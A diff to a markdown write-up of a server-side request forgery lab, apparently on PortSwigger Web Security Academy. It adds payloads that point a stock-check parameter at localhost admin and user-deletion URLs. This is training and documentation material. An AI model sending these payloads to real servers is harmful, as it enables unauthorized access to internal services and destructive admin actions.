@@ -7,10 +7,7 @@ The application fetches a user-supplied URL server-side without proper allow‑l
 An attacker can coerce requests to **internal endpoints** or **cloud metadata**.
 
 ## Target Pattern
-- Endpoint:
-  POST /product/stock HTTP/2
-  Host: <lab-host>web-security-academy.net
-  Cookie: session=<redacted>
+- Endpoint: POST /product/stock HTTP/2 (param: stockApi=http://localhost/admin/delete?username=carlos)
 
 ## Steps to Reproduce
 1) Identify a feature that **fetches a URL** server-side (stock check, image fetch, PDF fetch).
@@ -25,7 +22,8 @@ An attacker can coerce requests to **internal endpoints** or **cloud metadata**.
 - Screenshot: ![PS‑008](../../evidence/ps-ssrf/ps-008-screenshot.png)
 
 ## Payloads
-stockApi=http://localhost/admin/delete?username=carlos
+http://localhost/admin
+http://localhost/admin/delete?username=carlos
 
 ## Impact
 Access to internal services or cloud metadata → credential exposure, pivot, privilege escalation.
